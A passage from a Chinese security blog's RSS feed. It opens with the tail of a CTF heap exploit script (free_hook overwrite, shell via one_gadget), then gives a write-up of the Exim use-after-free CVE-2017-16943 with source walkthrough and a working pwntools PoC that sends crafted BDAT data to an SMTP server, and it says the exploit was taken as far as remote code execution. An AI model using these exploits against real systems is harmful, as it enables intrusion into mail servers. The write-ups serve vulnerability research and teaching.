p64(0x100) + p64(heap_base+240-0x602040) + p64(0x602040)*4</div><div class="line">    edit(p, 2, payload)</div><div class="line">    delete(p, 2)</div><div class="line"></div><div class="line">    # modify free_hook -&gt; one_gadget</div><div class="line">    gadget1 = 0xf1117</div><div class="line">    gadget2 = 0xf0274</div><div class="line">    gadget3 = 0xcd1c8</div><div class="line">    gadget4 = 0xcd0f3</div><div class="line">    gadget5 = 0x4526a</div><div class="line">    gadget6 = 0xf66c0</div><div class="line">    gadget_address = libc_base + gadget1</div><div class="line">    add(p, 0xe0, &quot;t&quot;*0xd0)</div><div class="line"></div><div class="line">    payload = p64(232) + p64(libc_base + libc.symbols[&quot;__environ&quot;])</div><div class="line">    payload += p64(232) + p64(0x602148)</div><div class="line">    add(p, 0x100, payload)</div><div class="line">    p.readuntil(&quot;# CONTENT: &quot;)</div><div class="line">    stack = p.read(6)</div><div class="line">    stack += &quot;\x00&quot;*(8-len(stack))</div><div class="line">    stack_env = u64(stack)</div><div class="line">    print &quot;env_stack address: &quot; + hex(stack_env)</div><div class="line">    # pause()</div><div class="line">    edit(p, 2, p64(stack_env-240))</div><div class="line">    edit(p, 1, p64(gadget_address))</div><div class="line">    p.readuntil(&quot;(CMD)&gt;&gt;&gt;&quot;)</div><div class="line">    p.sendline(&quot;Q&quot;)</div><div class="line">    p.interactive()</div><div class="line">    </div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    main()</div></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本篇文章分析了</p>
<ul>
<li>house of spirit</li>
<li>house_of_force</li>
<li>house_of_einherjar</li>
</ul>
<p>三种利用方法，还剩两种</p>
<ul>
<li>house_of_orange</li>
<li>house_of_lore</li>
</ul>
<p>其中，<code>house_of_lore</code>没发现有具体的实例题目，所以暂时不做研究</p>
<p>而<code>house_of_orange</code>涉及的知识点过多，所以会单独写一篇</p>
<p>house of系列第一次出现是<code>Phrack</code>2009年的杂志上，一共出现了下面几种：</p>
<ul>
<li>The House of Mind</li>
<li>The House of Prime</li>
<li>The House of Spirit</li>
<li>The House of Force</li>
<li>The House of Lore</li>
</ul>
<p>最后三种在how2heap上都有，前面两种，下次再说</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li><a href="https://github.com/shellphish/how2heap" target="_blank" rel="external">https://github.com/shellphish/how2heap</a></li>
<li><a href="https://github.com/ctfs/write-ups-2016" target="_blank" rel="external">https://github.com/ctfs/write-ups-2016</a></li>
<li><a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html" target="_blank" rel="external">https://code.woboq.org/userspace/glibc/malloc/malloc.c.html</a></li>
<li><a href="http://www.phrack.org/issues/66/10.html" target="_blank" rel="external">http://www.phrack.org/issues/66/10.html</a></li>
</ol>
]]></content:encoded>
      
      <comments>http://0x48.pw/2018/01/16/0x41/#disqus_thread</comments>
    </item>
    
    <item>
      <title>CVE-2017-16943 Exim UAF漏洞分析--后续</title>
      <link>http://0x48.pw/2017/12/08/0x3F/</link>
      <guid>http://0x48.pw/2017/12/08/0x3F/</guid>
      <pubDate>Fri, 08 Dec 2017 06:15:55 GMT</pubDate>
      <description>
      
        &lt;p&gt;&lt;a href=&quot;https://paper.seebug.org/469/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;上一篇分析&lt;/a&gt;出来后，经过@orange的提点，得知了meh公布的PoC是需要特殊配置才能触发，所以我上一篇分析文章最后的结论应该改成，在默认配置情况下，meh提供的PoC无法成功触发uaf漏洞。之后我又对为啥修改了配置后能触发和默认情况下如何触发漏洞进行了研究&lt;/p&gt;
      
      </description>
      
      <content:encoded><![CDATA[<p><a href="https://paper.seebug.org/469/" target="_blank" rel="external">上一篇分析</a>出来后，经过@orange的提点，得知了meh公布的PoC是需要特殊配置才能触发，所以我上一篇分析文章最后的结论应该改成，在默认配置情况下，meh提供的PoC无法成功触发uaf漏洞。之后我又对为啥修改了配置后能触发和默认情况下如何触发漏洞进行了研究</p>
<a id="more"></a>
<h1 id="重新复现漏洞"><a href="#重新复现漏洞" class="headerlink" title="重新复现漏洞"></a>重新复现漏洞</h1><p>比上一篇分析中复现的步骤，只需要多一步，注释了<code>/usr/exim/configure</code>文件中的<code>control = dkim_disable_verify</code></p>
<p>然后调整下poc的padding，就可以成功触发UAF漏洞，控制rip</p>
<h2 id="分析特殊配置下的触发流程"><a href="#分析特殊配置下的触发流程" class="headerlink" title="分析特殊配置下的触发流程"></a>分析特殊配置下的触发流程</h2><p>在代码中有一个变量是<code>dkim_disable_verify</code>, 在设置后会变成<code>true</code>，所以注释掉的情况下，就为默认值<code>false</code>, 然后再看看<code>receive.c</code>中的代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function">BOOL</span></div><div class="line"><span class="title">receive_msg</span><span class="params">(BOOL extract_recip)</span></div><div class="line">&#123;</div><div class="line">......</div><div class="line"><span class="number">1733</span>：<span class="keyword">if</span> (smtp_input &amp;&amp; !smtp_batched_input &amp;&amp; !dkim_disable_verify)</div><div class="line"><span class="number">1734</span>：  dkim_exim_verify_init(chunking_state &lt;= CHUNKING_OFFERED);</div><div class="line"><span class="number">1735</span>：<span class="meta">#<span class="meta-keyword">endif</span></span></div></pre></td></tr></table></figure>
<p>进入了<code>dkim_exim_verify_init</code>函数，之后的大致流程：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">dkim_exim_verify_init -&gt; pdkim_init_verify -&gt; ctx-&gt;linebuf = store_get(PDKIM_MAX_BODY_LINE_LEN);</div><div class="line"></div><div class="line">bdat_getc -&gt; smtp_getc -&gt; smtp_refill -&gt; dkim_exim_verify_feed -&gt; pdkim_feed -&gt; string_catn -&gt; string_get -&gt; store_get(0x64)</div><div class="line"></div><div class="line">#define PDKIM_MAX_BODY_LINE_LEN     16384       //0x4000</div></pre></td></tr></table></figure>
<p>在上一篇文章中说过了，无法成功触发uaf漏洞的原因是，被free的堆处于堆顶，释放后就和top chunk合并了。</p>
<p>在注释了dkim的配置后，在<code>dkim_exim_verify_init</code> 函数的流程中，执行了一个<code>store_get</code> 函数，申请了一个0x4000大小的堆，然后在<code>dkim_exim_verify_init</code> 函数和<code>dkim_exim_verify_feed</code> 函数中，都有如下的代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">store_pool = POOL_PERM;</div><div class="line">......</div><div class="line">store_pool = dkim_verify_oldpool;</div><div class="line">---------------</div><div class="line">enum &#123; POOL_MAIN, POOL_PERM, POOL_SEARCH &#125;;</div></pre></td></tr></table></figure>
<p><code>store_pool</code>全局变量被修改为了1，之前说过了，exim自己实现了一套堆管理，当<code>store_pool</code>不同时，相当于对堆进行了隔离，不会影响<code>receive_msg</code> 函数中使用堆管理时的<code>current_block</code>这类的堆管理全局变量</p>
<p>当dkim相关的代码执行结束后，还把<code>store_pool</code>恢复回去了</p>
<p>因为申请了一个0x4000大小的堆，大于0x2000，所以申请之后<code>yield_length</code>全局变量的值变为了0，导致了之后<code>store_get(0x64)</code>再次申请了一块堆，所以有了两块堆放在了heap1的上面，释放heap1后，heap1被放入了unsortbin，成功触发了uaf漏洞，造成crash。(之前的文章中都有写到)</p>
<h2 id="默认配置情况下复现漏洞"><a href="#默认配置情况下复现漏洞" class="headerlink" title="默认配置情况下复现漏洞"></a>默认配置情况下复现漏洞</h2><p>在特殊配置情况下复现了漏洞后，又进行了如果在默认配置情况下触发漏洞的研究。</p>
<p>在@explorer大佬的教导下，发现了一种在默认情况下触发漏洞的情况。</p>
<p>其实触发的关键点，就是想办法在heap1上面再malloc一个堆，现在我们从头来开始分析</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">// daemon.c</div><div class="line"></div><div class="line">137 static void</div><div class="line">138 handle_smtp_call(int *listen_sockets, int listen_socket_count,</div><div class="line">139  int accept_socket, struct sockaddr *accepted)</div><div class="line">140 &#123;</div><div class="line">......</div><div class="line">348 pid = fork();</div><div class="line">352 if (pid == 0)</div><div class="line">353   &#123;</div><div class="line">......</div><div class="line">504     if ((rc = smtp_setup_msg()) &gt; 0)</div><div class="line">505       &#123;</div><div class="line">506       BOOL ok = receive_msg(FALSE);</div><div class="line">......</div></pre></td></tr></table></figure>
<p>首先，当有新连接进来的时候，fork一个子进程，然后进入上面代码中的那个分支，<code>smtp_setup_msg</code>函数是用来接收命令的函数，我们先发一堆无效的命令过去(padding)，控制<code>yield_length</code>的值小于0x100，目的上一篇文章说过了，因为命令无效，流程再一次进入了<code>smtp_setup_msg</code></p>
<p>这时候我们发送一个命令<code>BDAT 16356</code></p>
<p>然后有几个比较重要的操作：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">5085       if (sscanf(CS smtp_cmd_data, &quot;%u %n&quot;, &amp;chunking_datasize, &amp;n) &lt; 1)</div><div class="line">5093       chunking_data_left = chunking_datasize;</div><div class="line">5100       lwr_receive_getc = receive_getc;</div><div class="line">5101       lwr_receive_getbuf = receive_getbuf;</div><div class="line">5102       lwr_receive_ungetc = receive_ungetc;</div><div class="line">5104       receive_getc = bdat_getc;</div><div class="line">5105       receive_ungetc = bdat_ungetc;</div></pre></td></tr></table></figure>
<p>首先是把输入的16356赋值给<code>chunking_data_left</code></p>
<p>然后把<code>receive_getc</code>换成<code>bdat_getc</code>函数</p>
<p>再做完这些的操作后，进入了<code>receive_msg</code>函数，按照上篇文章的流程差不多，显示申请了一个0x100的heap1</p>
<p>然后进入<code>receive_getc=bdat_getc</code>读取数据:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="number">534</span> <span class="keyword">int</span></div><div class="line"><span class="number">535</span> bdat_getc(<span class="keyword">unsigned</span> lim)</div><div class="line"><span class="number">536</span> &#123;</div><div class="line">......</div><div class="line"><span class="number">546</span>   <span class="keyword">if</span> (chunking_data_left &gt; <span class="number">0</span>)</div><div class="line"><span class="number">547</span>     <span class="keyword">return</span> lwr_receive_getc(chunking_data_left--);</div></pre></td></tr></table></figure>
<p><code>lwr_receive_getc=smtp_getc</code>通过该函数获取16356个字符串</p>
<p>首先，我们发送16352个a作为padding，然后执行了下面这流程:</p>
<ul>
<li>store_extend return 0 -&gt; store_get -&gt; store_release</li>
</ul>
<p>先申请了一个0x4010的heap2，然后释放了长度为0x2010的heap1</p>
<p>然后发送<code>:\r\n</code>，进入下面的代码分支:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="number">1902</span>   <span class="keyword">if</span> (ch == <span class="string">'\r'</span>)</div><div class="line"><span class="number">1903</span>     &#123;</div><div class="line"><span class="number">1904</span>     ch = (receive_getc)(GETC_BUFFER_UNLIMITED);</div><div class="line"><span class="number">1905</span>     <span class="keyword">if</span> (ch == <span class="string">'\n'</span>)</div><div class="line"><span class="number">1906</span>       &#123;</div><div class="line"><span class="number">1907</span>       <span class="keyword">if</span> (first_line_ended_crlf == TRUE_UNSET) first_line_ended_crlf = TRUE;</div><div class="line"><span class="number">1908</span>       <span class="keyword">goto</span> EOL;</div><div class="line"><span class="number">1909</span>       &#125;</div></pre></td></tr></table></figure>
<p>跳到了EOL，最重要的是最后几行代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="number">2215</span>   header_size = <span class="number">256</span>;</div><div class="line"><span class="number">2216</span>   next = store_get(<span class="keyword">sizeof</span>(header_line));</div><div class="line"><span class="number">2217</span>   next-&gt;text = store_get(header_size);</div><div class="line"><span class="number">2218</span>   ptr = <span class="number">0</span>;</div><div class="line"><span class="number">2219</span>   had_zero = <span class="number">0</span>;</div><div class="line"><span class="number">2220</span>   prevlines_length = <span class="number">0</span>;</div><div class="line"><span class="number">2221</span>   &#125;      <span class="comment">/* Continue, starting to read the next header */</span></div></pre></td></tr></table></figure>
<p>把一些变量重新进行了初始化，因为之前因为padding执行了<code>store_get(0x4000)</code>，所以这个时候<code>yield_length=0</code> 这个时候再次调用store_get将会申请一个0x2000大小堆，从unsortbin中发现heap1大小正好合适，所以这个时候得到的就是heap1，在heap1的顶上有一个之前<code>next-&gt;text</code>使用，大小0x4010，未释放的堆。</p>
<p>之后流程的原理其实跟之前的差不多，PoC如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">r = remote(<span class="string">'localhost'</span>, <span class="number">25</span>)</div><div class="line"></div><div class="line">r.recvline()</div><div class="line">r.sendline(<span class="string">"EHLO test"</span>)</div><div class="line">r.recvuntil(<span class="string">"250 HELP"</span>)</div><div class="line">r.sendline(<span class="string">"MAIL FROM:&lt;test@localhost&gt;"</span>)</div><div class="line">r.recvline()</div><div class="line">r.sendline(<span class="string">"RCPT TO:&lt;test@localhost&gt;"</span>)</div><div class="line">r.recvline()</div><div class="line"><span class="comment"># raw_input()</span></div><div class="line">r.sendline(<span class="string">'a'</span>*<span class="number">0x1300</span>+<span class="string">'\x7f'</span>)</div><div class="line"><span class="comment"># raw_input()</span></div><div class="line">r.recvuntil(<span class="string">'command'</span>)</div><div class="line">r.sendline(<span class="string">'BDAT 16356'</span>)</div><div class="line">r.sendline(<span class="string">"a"</span>*<span class="number">16352</span>+<span class="string">':\r'</span>)</div><div class="line">r.sendline(<span class="string">'aBDAT \x7f'</span>)</div><div class="line">s = <span class="string">'a'</span>*<span class="number">6</span> + p64(<span class="number">0xabcdef</span>)*(<span class="number">0x1e00</span>/<span class="number">8</span>)</div><div class="line">r.send(s+ <span class="string">':\r\n'</span>)</div><div class="line">r.recvuntil(<span class="string">'command'</span>)</div><div class="line"><span class="comment">#raw_input()</span></div><div class="line">r.send(<span class="string">'\n'</span>)</div></pre></td></tr></table></figure>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>根据该CVE作者发的文章，得知是利用文件IO的fflush来控制第一个参数，然后通过堆喷和内存枚举来来伪造vtable，最后跳转到<code>expand_string</code>函数来执行命令，正好我最近也在研究ctf中的<code>_IO_FILE</code>的相关利用(之后应该会写几篇这方面相关的blog)，然后实现了RCE，结果图如下：</p>
<p><img src="/img/exim1.png" alt="exim1"></p>
<p><img src="/img/exim2.png" alt="exim2"></p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://devco.re/blog/2017/12/11/Exim-RCE-advisory-CVE-2017-16943-en/" target="_blank" rel="external">https://devco.re/blog/2017/12/11/Exim-RCE-advisory-CVE-2017-16943-en/</a></li>
</ol>
]]></content:encoded>
      
      <comments>http://0x48.pw/2017/12/08/0x3F/#disqus_thread</comments>
    </item>
    
  </channel>
</rss>
